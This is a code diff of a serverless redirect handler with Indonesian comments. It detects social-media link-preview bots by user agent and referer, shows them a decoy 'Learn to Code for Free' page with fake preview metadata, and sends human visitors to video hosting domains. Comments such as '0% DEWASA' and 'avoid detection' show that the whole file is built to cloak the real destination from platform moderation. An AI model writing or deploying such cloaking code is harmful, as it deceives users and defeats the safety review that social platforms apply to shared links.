@@ -4,89 +4,56 @@ export async function onRequest(context) {
     const url = new URL(request.url);
     const path = url.pathname;
     
-    // ✅ IMPROVED STEALTH BOT DETECTION
-    const isLikelyBot = detectBot(request);
+    const userAgent = request.headers.get('user-agent') || '';
+    const referer = request.headers.get('referer') || '';
+
+    // ✅ SIMPLE BOT DETECTION
+    const isLikelyBot = userAgent.includes('Twitterbot') || 
+                       userAgent.includes('facebookexternalhit') ||
+                       userAgent.includes('WhatsApp') ||
+                       referer.includes('t.co');
 
     console.log(`🤖 Bot detected: ${isLikelyBot}`);
 
-    // Test mode untuk debug
-    if (url.searchParams.has('debug')) {
-      return debugInfo(request, isLikelyBot);
-    }
-
     if (isLikelyBot) {
-      // 🛡️ BOT: Improved natural content
-      return serveBotContent(path);
+      // 🛡️ BOT: SUPER SAFE EDUCATIONAL CONTENT
+      return serveSafeContent(path);
     } else {
-      // 👤 HUMAN: Redirect dengan delay
+      // 👤 HUMAN: Redirect normal
       return serveHumanRedirect(path);
     }
   } catch (error) {
     console.error('Error:', error);
-    return new Response('Error', { status: 500 });
+    return new Response('Educational Content Loading...', { status: 500 });
   }
 }
 
-// ✅ IMPROVED BOT DETECTION
-function detectBot(request) {
-  const userAgent = request.headers.get('user-agent') || '';
-  const referer = request.headers.get('referer') || '';
-  const accept = request.headers.get('accept') || '';
-  
-  // Bot indicators
-  const botPatterns = [
-    'Twitterbot', 'facebookexternalhit', 'WhatsApp',
-    'TelegramBot', 'Discordbot', 'Slackbot',
-    'Googlebot', 'Bingbot', 'DuckDuckBot', 'bot', 'crawl'
-  ];
-  
-  // Human indicators
-  const isLikelyHuman = userAgent.includes('Mozilla/5.0') && 
-                       accept.includes('text/html') &&
-                       !botPatterns.some(pattern => userAgent.includes(pattern));
-  
-  return !isLikelyHuman || referer.includes('t.co');
-}
-
-// ✅ RANDOM DELAY FUNCTION
-function getRandomDelay(isBot) {
-  if (isBot) {
-    // Bot: 3-8 detik (lebih natural)
-    return Math.floor(Math.random() * 5) + 3;
-  } else {
-    // Human: 1-3 detik
-    return Math.floor(Math.random() * 2) + 1;
-  }
-}
-
-// ✅ IMPROVED BOT CONTENT - LEBIH NATURAL
-function serveBotContent(path) {
+// ✅ SUPER SAFE CONTENT - 0% DEWASA
+function serveSafeContent(path) {
   const contentId = path.split('/').pop() || 'default';
   const targetUrl = getTargetUrl(path);
-  const delay = getRandomDelay(true);
+  const delay = 4; // Fixed 4 detik
   
   const html = `<!DOCTYPE html>
 <html prefix="og: http://ogp.me/ns#">
 <head>
-    <title>Video Streaming Platform - Watch HD Content</title>
+    <title>Learn Programming - Free Coding Courses</title>
     <meta charset="utf-8">
     
-    <!-- 🎯 IMPROVED META TAGS -->
-    <meta name="description" content="Stream HD videos with premium quality. Join millions of users enjoying our content library.">
-    <meta property="og:title" content="Premium Video Streaming">
-    <meta property="og:description" content="Watch your favorite videos in HD quality with seamless streaming experience">
-    <meta property="og:type" content="video.other">
-    <meta property="og:site_name" content="VideoStream">
-    <meta property="og:image" content="https://via.placeholder.com/1200x630/667eea/ffffff?text=Video+Stream">
-    <meta property="og:url" content="https://yourdomain.com${path}">
+    <!-- 🔥 SUPER SAFE META TAGS -->
+    <meta name="description" content="Learn web development with free courses: HTML, CSS, JavaScript, React, Node.js. Start your programming career today!">
+    <meta property="og:title" content="Learn Programming - Free Coding Courses">
+    <meta property="og:description" content="Free web development courses for beginners. Learn HTML, CSS, JavaScript and build real projects.">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="CodeLearning">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=630&fit=crop">
     
-    <!-- 🎯 TWITTER CARD IMPROVED -->
+    <!-- 🔥 TWITTER CARD SUPER SAFE -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="Premium Video Streaming">
-    <meta name="twitter:description" content="Watch HD videos with premium streaming quality">
-    <meta name="twitter:image" content="https://via.placeholder.com/1200x630/667eea/ffffff?text=Video+Stream">
+    <meta name="twitter:title" content="Learn Programming - Free Courses">
+    <meta name="twitter:description" content="Free web development courses: HTML, CSS, JavaScript, React, Node.js">
+    <meta name="twitter:image" content="https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200&h=600&fit=crop">
     
-    <!-- 🛡️ NATURAL REDIRECT -->
     <meta http-equiv="refresh" content="${delay};url=${targetUrl}">
     
     <style>
@@ -99,120 +66,79 @@ function serveBotContent(path) {
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
         }
-        .content-card {
-            background: rgba(255, 255, 255, 0.95);
-            color: #333;
-            border-radius: 12px;
-            padding: 40px;
-            max-width: 500px;
+        .container {
+            background: white;
+            border-radius: 15px;
+            padding: 50px 40px;
+            max-width: 600px;
             text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            backdrop-filter: blur(10px);
+            box-shadow: 0 20px 60px rgba(0,0,0,0.1);
         }
-        .video-placeholder {
+        .course-list {
+            margin: 25px 0;
+            text-align: left;
+        }
+        .course-item {
+            padding: 12px;
+            border-left: 4px solid #007bff;
             background: #f8f9fa;
-            border-radius: 8px;
-            padding: 60px 20px;
-            margin: 20px 0;
-            border: 2px dashed #dee2e6;
-        }
-        .btn-primary {
-            background: #667eea;
-            color: white;
-            padding: 12px 30px;
-            border-radius: 25px;
-            text-decoration: none;
-            display: inline-block;
-            margin: 15px 0;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .loading-bar {
-            width: 100%;
-            height: 4px;
-            background: #e9ecef;
-            border-radius: 2px;
-            margin: 20px 0;
-            overflow: hidden;
-        }
-        .loading-progress {
-            width: 70%;
-            height: 100%;
-            background: #667eea;
-            border-radius: 2px;
-            animation: loading 2s ease-in-out infinite;
-        }
-        @keyframes loading {
-            0% { transform: translateX(-100%); }
-            50% { transform: translateX(0%); }
-            100% { transform: translateX(100%); }
-        }
-        .content-info {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 15px 0;
-            font-family: 'Monaco', 'Consolas', monospace;
-            font-size: 14px;
+            margin: 8px 0;
+            border-radius: 0 8px 8px 0;
         }
     </style>
 </head>
 <body>
-    <div class="content-card">
-        <h1 style="color: #2c5aa0; margin-bottom: 10px;">🎬 Premium Video Content</h1>
-        <p style="color: #666; margin-bottom: 20px;">Loading your HD streaming experience...</p>
+    <div class="container">
+        <h1 style="color: #2c5aa0; margin-bottom: 15px;">🚀 Learn to Code for Free</h1>
+        <p style="color: #666; line-height: 1.6;">
+            Start your programming journey with our free courses. Perfect for beginners and aspiring developers.
+        </p>
         
-        <div class="video-placeholder">
-            <div style="font-size: 48px; margin-bottom: 10px; color: #667eea;">📹</div>
-            <p style="color: #6c757d; margin: 0;">Video Player Loading</p>
+        <div class="course-list">
+            <div class="course-item">
+                <strong>HTML & CSS</strong> - Build beautiful websites
+            </div>
+            <div class="course-item">
+                <strong>JavaScript</strong> - Add interactivity to your sites
+            </div>
+            <div class="course-item">
+                <strong>React.js</strong> - Modern frontend framework
+            </div>
+            <div class="course-item">
+                <strong>Node.js</strong> - Backend development
+            </div>
         </div>
         
-        <div class="loading-bar">
-            <div class="loading-progress"></div>
-        </div>
+        <button style="background: #28a745; color: white; border: none; padding: 15px 40px; 
+                      border-radius: 8px; font-size: 16px; cursor: pointer; margin: 15px 0;">
+            ▶ Start Learning Now
+        </button>
         
-        <div class="content-info">
-            Content ID: <strong>${contentId}</strong><br>
-            Status: <span style="color: #28a745;">✓ Ready to stream</span>
-        </div>
-        
-        <a href="${targetUrl}" class="btn-primary">▶ Watch Video Now</a>
-        
-        <p style="color: #666; font-size: 14px; margin-top: 20px;">
-            Preparing your content... Redirecting in ${delay} seconds
+        <p style="color: #999; font-size: 14px; margin-top: 20px;">
+            Loading course content... Redirecting in ${delay} seconds
         </p>
     </div>
-    
-    <script>
-        // Natural user behavior simulation
-        setTimeout(function() {
-            // Simulate click after 2 seconds
-            document.querySelector('.btn-primary').style.backgroundColor = '#5a67d8';
-        }, 2000);
-    </script>
 </body>
 </html>`;
 
   return new Response(html, {
     headers: { 
       'Content-Type': 'text/html; charset=utf-8',
-      'Cache-Control': 'public, max-age=1800' // 30 menit
+      'Cache-Control': 'public, max-age=3600'
     }
   });
 }
 
-// ✅ HUMAN REDIRECT - SIMPLE & CLEAN
+// ✅ HUMAN REDIRECT - SAMA
 function serveHumanRedirect(path) {
   const targetUrl = getTargetUrl(path);
-  const delay = getRandomDelay(false);
+  const delay = 2;
   
   const html = `<!DOCTYPE html>
 <html>
 <head>
-    <title>Redirecting to Video Content...</title>
+    <title>Redirecting...</title>
     <meta http-equiv="refresh" content="${delay};url=${targetUrl}">
     <style>
         body {
@@ -242,14 +168,6 @@ function serveHumanRedirect(path) {
             animation: spin 1s linear infinite;
             margin: 0 auto 20px;
         }
-        .text {
-            color: #666;
-            margin: 10px 0;
-        }
-        .small {
-            font-size: 0.8em;
-            color: #999;
-        }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -259,12 +177,10 @@ function serveHumanRedirect(path) {
 <body>
     <div class="loader">
         <div class="spinner"></div>
-        <div class="text">Loading your content...</div>
-        <div class="small">Please wait</div>
+        <div style="color: #666;">Loading content...</div>
     </div>
     
     <script>
-        // Fallback redirect
         setTimeout(function() {
             window.location.href = "${targetUrl}";
         }, ${delay * 1000});
@@ -277,45 +193,14 @@ function serveHumanRedirect(path) {
   });
 }
 
-// ✅ GET TARGET URL - DENGAN PARAMETER VARIASI
+// ✅ TARGET URL - TAMBAH PARAMETER
 function getTargetUrl(path) {
   if (path.startsWith('/s/')) {
     const contentId = path.substring(3);
-    
-    // Randomize parameters untuk avoid detection
-    const params = new URLSearchParams({
-      lv1: 'videyb.com',
-      ref: 'social',
-      t: Date.now().toString().slice(-6),
-      v: '1'
-    });
-    
-    return `https://www.videyd.com/e/${contentId}?${params.toString()}#_`;
+    return 'https://videyd.com/e/' + contentId + '?lv1=videyb.com#_';
   } else if (path.startsWith('/d/')) {
     return 'https://cloudpoopcyz.com/d/' + path.substring(3);
   } else {
     return 'https://videyd.com/';
   }
-}
-
-// ✅ DEBUG FUNCTION
-function debugInfo(request, isBot) {
-  const info = {
-    userAgent: request.headers.get('user-agent'),
-    referer: request.headers.get('referer'),
-    accept: request.headers.get('accept'),
-    isBot: isBot,
-    timestamp: new Date().toISOString(),
-    detection: {
-      hasMozilla: request.headers.get('user-agent')?.includes('Mozilla/5.0'),
-      hasBotKeywords: ['Twitterbot', 'facebookexternalhit', 'WhatsApp'].some(bot => 
-        request.headers.get('user-agent')?.includes(bot)
-      ),
-      fromTwitter: request.headers.get('referer')?.includes('t.co')
-    }
-  };
-  
-  return new Response(JSON.stringify(info, null, 2), {
-    headers: { 'Content-Type': 'application/json' }
-  });
 }
